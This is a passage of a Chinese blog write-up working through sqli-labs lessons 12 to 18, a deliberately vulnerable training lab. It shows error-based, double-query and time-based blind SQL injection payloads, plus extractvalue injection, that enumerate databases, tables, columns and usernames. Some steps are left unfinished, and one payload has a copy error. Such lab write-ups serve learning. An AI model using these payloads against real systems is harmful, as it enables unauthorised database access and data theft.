+<h1 id="les12-POST-Error-Based-Double-quotes-String"><a href="#les12-POST-Error-Based-Double-quotes-String" class="headerlink" title="les12:POST-Error Based- Double quotes- String"></a>les12:POST-Error Based- Double quotes- String</h1><h2 id="猜语句"><a href="#猜语句" class="headerlink" title="猜语句"></a>猜语句</h2><blockquote>
+<p>username:1’</p>
+</blockquote>
+<p>failed,没有报错</p>
+<blockquote>
+<p>username:1”</p>
+</blockquote>
+<p>这下有显示报错了</p>
+<img src="/2019/07/25/sqli-labs-master/12error.png" title="error">
+<p>这下知道了查询语句为👇</p>
+<blockquote>
+<p>$sql=”SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1”;</p>
+</blockquote>
+<h2 id="猜列数"><a href="#猜列数" class="headerlink" title="猜列数"></a>猜列数</h2><blockquote>
+<p>“) order by 3#也像les11一样是不存在第三列的</p>
+</blockquote>
+<h2 id="其他步骤"><a href="#其他步骤" class="headerlink" title="其他步骤"></a>其他步骤</h2><p>就跟<a href="https://ocgittt.github.io/2019/07/25/sqli-labs-les11/">les11</a>一模一样了</p>
+<hr>
+<h1 id="les13-POST-Double-Injection-String-with-twist"><a href="#les13-POST-Double-Injection-String-with-twist" class="headerlink" title="les13:POST-Double Injection- String- with twist"></a>les13:POST-Double Injection- String- with twist</h1><p>看题目已经知道是带括号的单引号的查询语句</p>
+<h2 id="猜语句-1"><a href="#猜语句-1" class="headerlink" title="猜语句"></a>猜语句</h2><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">username:</span><span class="string">'</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2019/07/25/sqli-labs-master/13error.png" title="error">
+
+<p>所以查询语句为:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql="<span class="keyword">SELECT</span> username, <span class="keyword">password</span> <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> username=(<span class="string">'$uname'</span>) <span class="keyword">and</span> <span class="keyword">password</span>=(<span class="string">'$passwd'</span>) <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span><span class="string">";</span></span><br></pre></td></tr></table></figure>
+
+<p>然而如果像les12一样输入</p>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username:') <span class="built_in">union</span> <span class="built_in">select</span> <span class="number">1</span>,<span class="number">2</span><span class="meta">#</span></span><br></pre></td></tr></table></figure>
+
+<p>会变成这样👇</p>
+<img src="/2019/07/25/sqli-labs-master/13successfully.png" title="successfully logged in">
+
+<p>但是这样并没有像les12一样显示出username:1   password:2</p>
+<p>所以要从另一个角度看,题目说着是double injection,那就来double injection的操作吧</p>
+<p>复习一下double injection需要用到的函数:</p>
+<blockquote>
+<p>rand() 生成一个0-1的随机数<br>floor()取整<br>count()统计查询对象的总数<br>group by x 按x对查询结果进行分组</p>
+</blockquote>
+<p>具体原理可以看一下付杰博客的<a href="https://www.fujieace.com/penetration-test/sql-double-injection.html" target="_blank" rel="noopener">SQL双查询注入详解</a></p>
+<h2 id="库名"><a href="#库名" class="headerlink" title="库名"></a>库名</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">') union <span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="string">'*'</span>,<span class="keyword">database</span>(),<span class="string">'*'</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">14</span>)*<span class="number">2</span>))<span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="表名"><a href="#表名" class="headerlink" title="表名"></a>表名</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">') union <span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()),<span class="number">0x7e</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">14</span>)*<span class="number">2</span>))<span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="列"><a href="#列" class="headerlink" title="列"></a>列</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">') union <span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="string">'*'</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span>),<span class="string">'*'</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">14</span>)*<span class="number">2</span>))<span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="值"><a href="#值" class="headerlink" title="值"></a>值</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">') union <span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="string">'*'</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(username) <span class="keyword">from</span> <span class="keyword">users</span>),<span class="string">'*'</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">6</span>)*<span class="number">2</span>))<span class="keyword">as</span> a <span class="keyword">from</span> information_schema.columns <span class="keyword">group</span> <span class="keyword">by</span> a <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p>有问题,这个会变成logged in successfully,而没有报错因此得不到数据</p>
+<hr>
+<h1 id="les14-POST-Double-injection-Single-quotes-String-with-twist"><a href="#les14-POST-Double-injection-Single-quotes-String-with-twist" class="headerlink" title="les14:POST-Double-injection-Single quotes-String-with twist"></a>les14:POST-Double-injection-Single quotes-String-with twist</h1><p>题目好像跟les13的题目是一样的,但查询语句是不同的</p>
+<p>试了几遍单引号和双引号都不行,投降查看源码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$uname</span>=<span class="string">'"'</span>.<span class="variable">$uname</span>.<span class="string">'"'</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$passwd</span>=<span class="string">'"'</span>.<span class="variable">$passwd</span>.<span class="string">'"'</span>; </span><br><span class="line"></span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">"SELECT username, password FROM users WHERE username=<span class="variable">$uname</span> and password=<span class="variable">$passwd</span> LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure>
+
+<p>观察了一下是在uname和passwd的基础上两边都加’”(一个单引号一个双引号)<br>故payload为 </p>
+<figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'" 语句 <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="库名-1"><a href="#库名-1" class="headerlink" title="库名"></a>库名</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'" union <span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="number">0x7e</span>,<span class="keyword">database</span>(),<span class="number">0x7e</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">14</span>)*<span class="number">2</span>))<span class="keyword">as</span> a <span class="keyword">from</span> informaition_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="表名-1"><a href="#表名-1" class="headerlink" title="表名"></a>表名</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'" union <span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()),<span class="number">0x7e</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">14</span>)*<span class="number">2</span>))<span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="列-1"><a href="#列-1" class="headerlink" title="列"></a>列</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'" union <span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span>),<span class="number">0x7e</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">14</span>)*<span class="number">2</span>))<span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="值-1"><a href="#值-1" class="headerlink" title="值"></a>值</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'" union <span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(username) <span class="keyword">from</span> <span class="keyword">users</span>),<span class="number">0x7e</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">14</span>)*<span class="number">2</span>))<span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p>这里跟les13一样都变成logged in successfully了…</p>
+<hr>
+<h1 id="les15-POST-Blind-Boolian-Based-String"><a href="#les15-POST-Blind-Boolian-Based-String" class="headerlink" title="les15:POST-Blind- Boolian Based- String"></a>les15:POST-Blind- Boolian Based- String</h1><h2 id="猜语句-2"><a href="#猜语句-2" class="headerlink" title="猜语句"></a>猜语句</h2><p>题目没有说是单引号还是双引号,没有说带不带括号,所以只能一个一个试了</p>
+<p>我之前试过用户名和密码都是admin的时候是登录成功的</p>
+<p>所以我是这样来猜查询语句的:</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">username</span><span class="selector-pseudo">:admin'</span>#</span><br><span class="line"><span class="selector-tag">password</span><span class="selector-pseudo">:admin</span></span><br></pre></td></tr></table></figure>
+
+<p>如果这样能登录成功的话,那就是说语句是单引号那种,很幸运一下就登录成功了</p>
+<p>接下来就可以开始注入了</p>
+<h2 id="库名-2"><a href="#库名-2" class="headerlink" title="库名"></a>库名</h2><p>由于是时间盲注,我们可以使用if(string1,string2,string3),sleep(),ascii(),substr(string,n,n)这几个函数组合在一起进行操作</p>
+<h3 id="库名第一个字母"><a href="#库名第一个字母" class="headerlink" title="库名第一个字母:"></a>库名第一个字母:</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' or (if(ascii(substr(database(),1,1))&gt;100,sleep(10),null))</span><br></pre></td></tr></table></figure>
+
+<p>结果等了好一会,看来是成功了</p>
+<p>然后</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' or (if(ascii(substr(database(),1,1))&gt;115,sleep(10),null))</span><br></pre></td></tr></table></figure>
+
+<p>这回马上就加载完毕了,看来是执行了null</p>
+<p>再换换数字</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' or (if(ascii(substr(database(),1,1))&gt;110,sleep(10),null))#</span><br></pre></td></tr></table></figure>
+
+<p>又等了不短的时间,得知这是大于110的</p>
+<p>经过种种换数字的操作,我们得知库名的第一个字母的ASCII码为115,也就是’s’</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' or (if(ascii(substr(database(),1,1))=115,sleep(10),null))<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="库名-3"><a href="#库名-3" class="headerlink" title="库名"></a>库名</h3><p>由于前面的题的经验,我们可以知道库名是’security’</p>
+<p>用下面的代码来验证一下是不是’security’</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' or (if(left(database(),8)='security',sleep(10),null))<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p>页面又加载了一段时间,看来是正确的</p>
+<h2 id="表名-2"><a href="#表名-2" class="headerlink" title="表名"></a>表名</h2><h3 id="表名的第一个字母"><a href="#表名的第一个字母" class="headerlink" title="表名的第一个字母"></a>表名的第一个字母</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' or (if(ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">100</span>,<span class="keyword">sleep</span>(<span class="number">10</span>),<span class="literal">null</span>))<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p>大于100</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' or (if(ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">105</span>,<span class="keyword">sleep</span>(<span class="number">10</span>),<span class="literal">null</span>))<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p>小于105</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' or (if(ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">101</span>,<span class="keyword">sleep</span>(<span class="number">10</span>),<span class="literal">null</span>))<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p>等于101<br>所以表名的第一个字母是’e’</p>
+<h3 id="第一个表名"><a href="#第一个表名" class="headerlink" title="第一个表名"></a>第一个表名</h3><p>又经验得第一个表名是’emails’</p>
+<h3 id="第二个表名"><a href="#第二个表名" class="headerlink" title="第二个表名"></a>第二个表名</h3><p>根据经验第二个表名的第一个字母为’r’  ASCII码为114,下面来验证一下</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' or (if(ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">114</span>,<span class="keyword">sleep</span>(<span class="number">10</span>),<span class="literal">null</span>))<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p>正确,看整个表名是否为’referers’</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' or (if(left((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>),<span class="number">8</span>)=<span class="string">'referers'</span>,<span class="keyword">sleep</span>(<span class="number">10</span>),<span class="literal">null</span>))<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p>验证成功</p>
+<h3 id="第三个表名"><a href="#第三个表名" class="headerlink" title="第三个表名"></a>第三个表名</h3><p>‘uagents’</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' or (if(left((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">2</span>,<span class="number">1</span>),<span class="number">7</span>)=<span class="string">'uagents'</span>,<span class="keyword">sleep</span>(<span class="number">10</span>),<span class="literal">null</span>))<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="第四个表名"><a href="#第四个表名" class="headerlink" title="第四个表名"></a>第四个表名</h3><p>‘users’</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' or (if(left((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">3</span>,<span class="number">1</span>),<span class="number">5</span>)=<span class="string">'users'</span>,<span class="keyword">sleep</span>(<span class="number">10</span>),<span class="literal">null</span>))<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="列-2"><a href="#列-2" class="headerlink" title="列"></a>列</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' or (if(ascii(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">85</span>,<span class="keyword">sleep</span>(<span class="number">10</span>),<span class="literal">null</span>))<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="第一列"><a href="#第一列" class="headerlink" title="第一列"></a>第一列</h3><p>‘USER’</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' or (if(left((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">4</span>)=<span class="string">'USER'</span>,<span class="keyword">sleep</span>(<span class="number">10</span>),<span class="literal">null</span>))<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="第二列"><a href="#第二列" class="headerlink" title="第二列"></a>第二列</h3><p>‘CURRENT_CONNECTIONS’</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' or (if(left((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>),<span class="number">19</span>)=<span class="string">'CURRENT_CONNECTIONS'</span>,<span class="keyword">sleep</span>(<span class="number">10</span>),<span class="literal">null</span>))<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="第三列"><a href="#第三列" class="headerlink" title="第三列"></a>第三列</h3><p>‘TOTAL_CONNECTIONS’</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' or (if(left((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="keyword">limit</span> <span class="number">2</span>,<span class="number">1</span>),<span class="number">17</span>)=<span class="string">'CURRENT_CONNECTIONS'</span>,<span class="keyword">sleep</span>(<span class="number">10</span>),<span class="literal">null</span>))<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="第四列"><a href="#第四列" class="headerlink" title="第四列"></a>第四列</h3><p>‘id’</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' or (if(left((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="keyword">limit</span> <span class="number">3</span>,<span class="number">1</span>),<span class="number">2</span>)=<span class="string">'id'</span>,<span class="keyword">sleep</span>(<span class="number">10</span>),<span class="literal">null</span>))<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="第五列"><a href="#第五列" class="headerlink" title="第五列"></a>第五列</h3><p>‘username’</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' or (if(left((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="keyword">limit</span> <span class="number">4</span>,<span class="number">1</span>),<span class="number">8</span>)=<span class="string">'username'</span>,<span class="keyword">sleep</span>(<span class="number">10</span>),<span class="literal">null</span>))<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="第六列"><a href="#第六列" class="headerlink" title="第六列"></a>第六列</h3><p>‘password’</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' or (if(left((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="keyword">limit</span> <span class="number">5</span>,<span class="number">1</span>),<span class="number">8</span>)=<span class="string">'password'</span>,<span class="keyword">sleep</span>(<span class="number">10</span>),<span class="literal">null</span>))<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="username值"><a href="#username值" class="headerlink" title="username值"></a>username值</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' or (if(ascii(substr((<span class="keyword">select</span> username <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">1</span>,<span class="keyword">sleep</span>(<span class="number">10</span>),<span class="literal">null</span>))<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="第一个值"><a href="#第一个值" class="headerlink" title="第一个值"></a>第一个值</h3><p>‘Dumb’</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' or (if(left((<span class="keyword">select</span> username <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">4</span>)=<span class="string">'Dumb'</span>,<span class="keyword">sleep</span>(<span class="number">10</span>),<span class="literal">null</span>))<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="……"><a href="#……" class="headerlink" title="……"></a>……</h3><h3 id="……-1"><a href="#……-1" class="headerlink" title="……"></a>……</h3><hr>
+<h1 id="les16-POST-Blind-Boolian-time-Based-Double-quotes"><a href="#les16-POST-Blind-Boolian-time-Based-Double-quotes" class="headerlink" title="les16:POST-Blind-Boolian/time Based-Double quotes"></a>les16:POST-Blind-Boolian/time Based-Double quotes</h1><p>把les15的’改为”即可</p>
+<hr>
+<h1 id="les17-POST-Update-Query-Error-based-String"><a href="#les17-POST-Update-Query-Error-based-String" class="headerlink" title="les17:POST-Update Query- Error based - String"></a>les17:POST-Update Query- Error based - String</h1><p>这题目…第一次见update语句的题</p>
+<p>update:用于修改表中的数据</p>
+<p>用法:<br>UPDATE 表名 SET 列名 = 新值 WHERE 列名 = 表中某值</p>
+<h2 id="猜语句-3"><a href="#猜语句-3" class="headerlink" title="猜语句"></a>猜语句</h2><p>用les15那种方法:</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">username</span><span class="selector-pseudo">:admin'</span></span><br><span class="line"><span class="selector-tag">password</span><span class="selector-pseudo">:admin</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2019/07/25/sqli-labs-master/172admin.png" title="不行">
+
+<p>只显示不行而没有得到想要的报错语句</p>
+<p>换了一种方式:</p>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">username:</span>admin</span><br><span class="line"><span class="symbol">password:</span>admin<span class="string">'</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2019/07/25/sqli-labs-master/17error.png" title="有语句了">
+
+<p>现在知道查询语句是单引号那种,再结合报错型盲注的语句即可</p>
+<h2 id="库名-4"><a href="#库名-4" class="headerlink" title="库名"></a>库名</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' or extractvalue(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">0x7e</span>))<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2019/07/25/sqli-labs-master/17database.png" title="dbname">
+
+<h2 id="表名-3"><a href="#表名-3" class="headerlink" title="表名"></a>表名</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' or extractvalue(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name)<span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()),<span class="number">0x7e</span>))<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="列名"><a href="#列名" class="headerlink" title="列名"></a>列名</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' or extractvalue(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name)<span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span>),<span class="number">0x7e</span>))<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p>这里显示的只有’USER’’CURRENT_CONNECTIONS’’TOTAL_CONNECTIONS’没有’id’’username’’password’,奇怪</p>
+<h2 id="值-2"><a href="#值-2" class="headerlink" title="值"></a>值</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' or extractvalue(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(username)<span class="keyword">from</span> <span class="keyword">users</span>),<span class="number">0x7e</span>))<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p>值这里竟然不报错…奇怪</p>
+<hr>
+<h1 id="les18-POST-Header-Injection-Uagent-field-Error-based"><a href="#les18-POST-Header-Injection-Uagent-field-Error-based" class="headerlink" title="les18:POST-Header Injection-Uagent field-Error based"></a>les18:POST-Header Injection-Uagent field-Error based</h1><p>这又是一种船新的题目</p>
+<p>一进场,如下:</p>
+<img src="/2019/07/25/sqli-labs-master/18start.png">
+
+<hr>
+<h2 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h2><h3 id="User-Agent头字段"><a href="#User-Agent头字段" class="headerlink" title="User-Agent头字段"></a>User-Agent头字段</h3><p>用户代理（user agent）是记录软件程序的客户端信息的HTTP请求头字段，用于将创建请求的浏览器和用户代理名称等信息传送给服务器。</p>
+<p><a href="https://blog.csdn.net/Eagle_pompom/article/details/89526180" target="_blank" rel="noopener">more info</a></p>
+<h2 id="看语句"><a href="#看语句" class="headerlink" title="看语句"></a>看语句</h2><p>这次两个都是admin都是failed</p>
+<img src="/2019/07/25/sqli-labs-master/18failed1.png">
+
+<p>试一下之前记得的Dumb</p>
+<img src="/2019/07/25/sqli-labs-master/18Dumb.png" title="显示User-Agent信息">
+
+<p>放弃了这次猜不到了</p>
+<p>看源码:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$uname = check_input($_POST[<span class="string">'uname'</span>]);</span><br><span class="line"></span><br><span class="line">$passwd = check_input($_POST[<span class="string">'passwd'</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>但是还有一个</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$insert=<span class="string">"INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)"</span>;</span><br></pre></td></tr></table></figure>
+
+<h2 id="库名-5"><a href="#库名-5" class="headerlink" title="库名"></a>库名</h2><p>用brupsuite抓包,在useragent后面加上:</p>
